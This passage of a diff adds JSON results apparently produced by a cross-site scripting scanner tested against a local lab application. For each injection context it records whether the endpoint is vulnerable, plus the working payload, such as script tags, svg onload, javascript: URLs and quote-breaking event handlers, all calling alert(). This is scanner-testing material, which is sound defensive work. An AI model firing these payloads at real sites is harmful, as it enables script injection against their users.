+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/css_style/DOUBLE_QUOTED_ATTRIBUTE?q=%3C%2Fstyle%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/css_style/HTML": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/css_style/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "</style><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/css_style/SINGLE_QUOTED_ATTRIBUTE?q=%3C%2Fstyle%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/css_style/UNQUOTED_ATTRIBUTE": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/css_style_font_value/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "</style><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/css_style_font_value/DOUBLE_QUOTED_ATTRIBUTE?q=%3C%2Fstyle%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/css_style_font_value/HTML": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/css_style_font_value/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "</style><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/css_style_font_value/SINGLE_QUOTED_ATTRIBUTE?q=%3C%2Fstyle%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/css_style_font_value/UNQUOTED_ATTRIBUTE": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/css_style_value/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "</style><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/css_style_value/DOUBLE_QUOTED_ATTRIBUTE?q=%3C%2Fstyle%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/css_style_value/HTML": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/css_style_value/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "</style><svg onload=alert(914771)>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/css_style_value/SINGLE_QUOTED_ATTRIBUTE?q=%3C%2Fstyle%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/css_style_value/UNQUOTED_ATTRIBUTE": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/form/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "<script>alert(914771)</script>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/form/DOUBLE_QUOTED_ATTRIBUTE?q=%3Cscript%3Ealert%28914771%29%3C%2Fscript%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/form/HTML": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/form/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "<script>alert(914771)</script>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/form/SINGLE_QUOTED_ATTRIBUTE?q=%3Cscript%3Ealert%28914771%29%3C%2Fscript%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/form/UNQUOTED_ATTRIBUTE": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/form_in_new_window/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "<script>alert(914771)</script>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/form_in_new_window/DOUBLE_QUOTED_ATTRIBUTE?q=%3Cscript%3Ealert%28914771%29%3C%2Fscript%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/form_in_new_window/HTML": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/form_in_new_window/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "<script>alert(914771)</script>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/form_in_new_window/SINGLE_QUOTED_ATTRIBUTE?q=%3Cscript%3Ealert%28914771%29%3C%2Fscript%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/form_in_new_window/UNQUOTED_ATTRIBUTE": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/head/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "<script>alert(914771)</script>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/head/DOUBLE_QUOTED_ATTRIBUTE?q=%3Cscript%3Ealert%28914771%29%3C%2Fscript%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/head/HTML": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/head/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "<script>alert(914771)</script>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/head/SINGLE_QUOTED_ATTRIBUTE?q=%3Cscript%3Ealert%28914771%29%3C%2Fscript%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/head/UNQUOTED_ATTRIBUTE": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/href/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "javascript:alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/href/DOUBLE_QUOTED_ATTRIBUTE?q=javascript%3Aalert%28914771%29"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/href/HTML": {
+   "evidence": {
+    "payload": "javascript:alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/href/HTML?q=javascript%3Aalert%28914771%29"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/href/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "\"><svg onload=alert(914771)>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/href/SINGLE_QUOTED_ATTRIBUTE?q=%22%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/href/UNQUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "\" onmouseover=\"alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/href/UNQUOTED_ATTRIBUTE?q=%22%20onmouseover%3D%22alert%28914771%29"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/iframe_attribute_value/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "' onmouseover='alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/iframe_attribute_value/DOUBLE_QUOTED_ATTRIBUTE?q=%27%20onmouseover%3D%27alert%28914771%29"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/iframe_attribute_value/HTML": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/iframe_attribute_value/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/iframe_attribute_value/UNQUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "' onmouseover='alert(914771)",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/iframe_attribute_value/UNQUOTED_ATTRIBUTE?q=%27%20onmouseover%3D%27alert%28914771%29"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/iframe_srcdoc/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "<script>alert(914771)</script>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/iframe_srcdoc/DOUBLE_QUOTED_ATTRIBUTE?q=%3Cscript%3Ealert%28914771%29%3C%2Fscript%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/iframe_srcdoc/HTML": {
+   "evidence": {
+    "payload": "<script>alert(914771)</script>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/iframe_srcdoc/HTML?q=%3Cscript%3Ealert%28914771%29%3C%2Fscript%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/iframe_srcdoc/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "<script>alert(914771)</script>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/iframe_srcdoc/SINGLE_QUOTED_ATTRIBUTE?q=%3Cscript%3Ealert%28914771%29%3C%2Fscript%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/iframe_srcdoc/UNQUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "<script>alert(914771)</script>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/iframe_srcdoc/UNQUOTED_ATTRIBUTE?q=%3Cscript%3Ealert%28914771%29%3C%2Fscript%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_assignment/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": " onmouseover=alert(914771) ",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_assignment/DOUBLE_QUOTED_ATTRIBUTE?q=%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_assignment/HTML": {
+   "evidence": {
+    "payload": " onmouseover=alert(914771) ",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_assignment/HTML?q=%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_assignment/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": " onmouseover=alert(914771) ",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_assignment/SINGLE_QUOTED_ATTRIBUTE?q=%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_assignment/UNQUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": " onmouseover=alert(914771) ",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_assignment/UNQUOTED_ATTRIBUTE?q=%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_comment/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "</script><svg onload=alert(914771)>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_comment/DOUBLE_QUOTED_ATTRIBUTE?q=%3C%2Fscript%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_comment/HTML": {
+   "evidence": {
+    "payload": "*/alert(914771)/*",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_comment/HTML?q=%2A%2Falert%28914771%29%2F%2A"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_comment/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "</script><svg onload=alert(914771)>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_comment/SINGLE_QUOTED_ATTRIBUTE?q=%3C%2Fscript%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_comment/UNQUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "*/alert(914771)/*",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_comment/UNQUOTED_ATTRIBUTE?q=%2A%2Falert%28914771%29%2F%2A"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_escape_doublequotes_eval/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": " onmouseover=alert(914771) ",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_escape_doublequotes_eval/DOUBLE_QUOTED_ATTRIBUTE?q=%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_escape_doublequotes_eval/HTML": {
+   "evidence": {
+    "payload": " onmouseover=alert(914771) ",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_escape_doublequotes_eval/HTML?q=%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_escape_doublequotes_eval/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": " onmouseover=alert(914771) ",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_escape_doublequotes_eval/SINGLE_QUOTED_ATTRIBUTE?q=%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_escape_doublequotes_eval/UNQUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": " onmouseover=alert(914771) ",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_escape_doublequotes_eval/UNQUOTED_ATTRIBUTE?q=%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_eval/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": " onmouseover=alert(914771) ",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_eval/DOUBLE_QUOTED_ATTRIBUTE?q=%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_eval/HTML": {
+   "evidence": {
+    "payload": " onmouseover=alert(914771) ",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_eval/HTML?q=%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_eval/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": " onmouseover=alert(914771) ",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_eval/SINGLE_QUOTED_ATTRIBUTE?q=%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_eval/UNQUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": " onmouseover=alert(914771) ",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_eval/UNQUOTED_ATTRIBUTE?q=%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_eventhandler_quoted/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": " onmouseover=alert(914771) ",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_eventhandler_quoted/DOUBLE_QUOTED_ATTRIBUTE?q=%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_eventhandler_quoted/HTML": {
+   "evidence": {
+    "payload": " onmouseover=alert(914771) ",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_eventhandler_quoted/HTML?q=%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_eventhandler_quoted/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "\"><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_eventhandler_quoted/SINGLE_QUOTED_ATTRIBUTE?q=%22%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_eventhandler_quoted/UNQUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": " onmouseover=alert(914771) ",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_eventhandler_quoted/UNQUOTED_ATTRIBUTE?q=%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_eventhandler_singlequoted/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "'><svg onload=alert(914771)>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_eventhandler_singlequoted/DOUBLE_QUOTED_ATTRIBUTE?q=%27%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_eventhandler_singlequoted/HTML": {
+   "evidence": {
+    "payload": " onmouseover=alert(914771) ",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_eventhandler_singlequoted/HTML?q=%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_eventhandler_singlequoted/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": " onmouseover=alert(914771) ",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_eventhandler_singlequoted/SINGLE_QUOTED_ATTRIBUTE?q=%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_eventhandler_singlequoted/UNQUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": " onmouseover=alert(914771) ",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_eventhandler_singlequoted/UNQUOTED_ATTRIBUTE?q=%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_eventhandler_unquoted/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "<img src=x onerror=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_eventhandler_unquoted/DOUBLE_QUOTED_ATTRIBUTE?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_eventhandler_unquoted/HTML": {
+   "evidence": {
+    "payload": " onmouseover=alert(914771) ",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_eventhandler_unquoted/HTML?q=%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_eventhandler_unquoted/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "<img src=x onerror=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_eventhandler_unquoted/SINGLE_QUOTED_ATTRIBUTE?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_eventhandler_unquoted/UNQUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": " onmouseover=alert(914771) ",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_eventhandler_unquoted/UNQUOTED_ATTRIBUTE?q=%20onmouseover%3Dalert%28914771%29%20"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_quoted_string/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "</script><svg onload=alert(914771)>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_quoted_string/DOUBLE_QUOTED_ATTRIBUTE?q=%3C%2Fscript%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_quoted_string/HTML": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/js_quoted_string/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "</script><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_quoted_string/SINGLE_QUOTED_ATTRIBUTE?q=%3C%2Fscript%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_quoted_string/UNQUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "\";alert(914771)//",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_quoted_string/UNQUOTED_ATTRIBUTE?q=%22%3Balert%28914771%29%2F%2F"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_singlequoted_string/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "</script><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_singlequoted_string/DOUBLE_QUOTED_ATTRIBUTE?q=%3C%2Fscript%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_singlequoted_string/HTML": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/js_singlequoted_string/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "</script><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_singlequoted_string/SINGLE_QUOTED_ATTRIBUTE?q=%3C%2Fscript%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_singlequoted_string/UNQUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "';alert(914771)//",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_singlequoted_string/UNQUOTED_ATTRIBUTE?q=%27%3Balert%28914771%29%2F%2F"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_slashquoted_string/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "</script><svg onload=alert(914771)>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_slashquoted_string/DOUBLE_QUOTED_ATTRIBUTE?q=%3C%2Fscript%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_slashquoted_string/HTML": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/js_slashquoted_string/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "</script><svg onload=alert(914771)>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/js_slashquoted_string/SINGLE_QUOTED_ATTRIBUTE?q=%3C%2Fscript%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/js_slashquoted_string/UNQUOTED_ATTRIBUTE": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/json/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "<script>alert(914771)</script>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/json/DOUBLE_QUOTED_ATTRIBUTE?q=%3Cscript%3Ealert%28914771%29%3C%2Fscript%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/json/HTML": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/json/SINGLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "<script>alert(914771)</script>",
+    "trigger": "load",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/json/SINGLE_QUOTED_ATTRIBUTE?q=%3Cscript%3Ealert%28914771%29%3C%2Fscript%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/json/UNQUOTED_ATTRIBUTE": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/noscript/DOUBLE_QUOTED_ATTRIBUTE": {
+   "evidence": {
+    "payload": "</noscript><svg onload=alert(914771)>",
+    "trigger": "interaction",
+    "url": "http://127.0.0.1:63733/reflected/escapedparameter/noscript/DOUBLE_QUOTED_ATTRIBUTE?q=%3C%2Fnoscript%3E%3Csvg%20onload%3Dalert%28914771%29%3E"
+   },
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": true
+  },
+  "/reflected/escapedparameter/noscript/HTML": {
+   "evidence": null,
+   "inject": "query:q",
+   "kind": "escaped",
+   "vulnerable": false
+  },
+  "/reflected/escapedparameter/noscript/SINGLE_QUOTED_ATTRIBUTE": {
